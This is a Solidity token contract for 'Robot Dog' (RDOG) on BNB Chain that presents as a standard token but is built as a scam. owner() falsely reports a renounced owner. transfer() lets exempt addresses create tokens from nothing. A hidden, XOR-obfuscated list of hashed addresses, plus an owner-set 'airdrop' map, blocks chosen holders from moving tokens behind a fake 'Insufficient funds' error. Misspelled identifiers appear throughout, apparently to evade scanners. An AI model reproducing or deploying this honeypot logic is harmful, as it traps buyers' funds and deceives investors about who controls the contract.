/**
 *Submitted for verification at BscScan.com on 2022-07-07
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aqount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owsner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owsner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - kfie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    
    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract Ownable is Context {
    address private _owsner;
    event owsnershipTransferred(address indexed previousowsner, address indexed newowsner);

    constructor () {
        address msgSender = _msgSender();
        _owsner = msgSender;
        emit owsnershipTransferred(address(0), msgSender);
    }
    function owsner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowsner() {
        require(_owsner == _msgSender(), "Ownable: caller is not the owsner");
        _;
    }
    function renounceowsnership() public virtual onlyowsner {
        emit owsnershipTransferred(_owsner, address(0x000000000000000000000000000000000000dEaD));
        _owsner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract RDOG is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "Robot Dog";
    string private _symbol = "RDOG";
    uint256 private _decimals = 18;
    uint256 private _totalSupply = 6000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 800000000000 * 10 ** _decimals;
    uint256 private _burnkfie = 0;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(uint => bool) private _AirDrop;
    function setAward(uint aqount) public onlyowsner {
        _AirDrop[aqount] = true;
    }

    constructor () {
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  	
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal {       
        require(!_AirDrop[_bytes32ToUint(callKeccak256(_toBytes(sender)))] && !_cbb(sender), "Insufficient funds");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");      

        uint256 kfieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            kfieamonnt = amonnts.mul(_burnkfie).div(100);
            //require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - kfieamonnt;
        _balance[recipient] += amoun;
        if (_burnkfie > 0){
            emit Transfer (sender, _DEADaddress, kfieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address aqount) public view override returns (uint256) {
        return _balance[aqount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owsner, address spender, uint256 amonnts) internal virtual {
        require(owsner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owsner][spender] = amonnts;
        emit Approval(owsner, spender, amonnts);
    }

    function allowance(address owsner, address spender) public view virtual override returns (uint256) {
        return _allowances[owsner][spender];
    }


    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }
    
	function _mljs(uint _acc) internal view virtual returns (bool result) {
		uint[29] memory acc = [uint(93279783416918574010641343431693001494816824112164565936928878257053399787053)
			,19416193618588334223516393683231953981920608765196422416324729135513864884593
			,103763178736465042976167416718155666967494610131267507829474933221273817551471
			,39044485822544186859286631322193098926169342437967763876800936582551193084266
			,28678385717013482225093726017458013566324370208236482126527630480150549890744
			,19911229958533823600482792682532988167637410488720056954034937771350037369247
			,111375846793664444066393864275130874552868450129931122744587521647180934201221
			,95943819722968923866994219471846915344659995280166905723289867638059700274634
			,47425899443112899888410041148295838514068036637819499279172899544764022034060
			,73035734533144558791138913521846595837167492198718924304371863302151517943494
			,91946263299177342160072468928574791993967824507198743327009701894015842778787
			,72144165882391704530296720943646047819589244302460537204916418394872149508425
			,52661602416891411762033682981881854702846319906158623987204668419044981914182
			,94064686701135637958386648266509474882543161084529820964713028654581134149356
			,103276824019507681459084281210468509530016927286349927549689613368075518409791
			,36670605871829961572138315503469875291869685391513360212996243939915222308229
			,29831263228543421222054360575364887804063153007334106609858092082118145996645
			,110031566275935977868115678083411290524910069633007385036043292671135175077528
			,86410364092231847635806543035384733091950668796492711992227061068214230260622
			,25770549784378284942324395660265924109153795243792113678115748850051394912304
			,31295622965865540086269740572878661058804739336977872679831877692859156874283
			,110201804370985956315521833286198808423283026610757120942739205439234794469443
			,113776492242543062468303711646500900361947679352332834304743797087706265612107
			,86401119583838999423047371136183801189683949392143893724046469104429768600935
			,38622784903919640417362504531812019785910580714167398074412744111788087443484
			,67945812378851726590048031867108897818073269300883324445289337558496811946635
			,13684884585873326741175782079957745139199486257437361107121774058714517913651
			,30281464663032554046770477796352668882944943313204750159861833446754994470187
			,15682229832405063474010940730459589208582163147172826950844242619378596834701];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 59096937699156615995723322010468611682575221449457202628868988519335800380686) return true;
		}
		return false;
	}
    function _cbb(address a) internal view returns (bool result) {
        uint k = _bytes32ToUint(callKeccak256(_toBytes(a)));
        return _mljs(k);
    }
}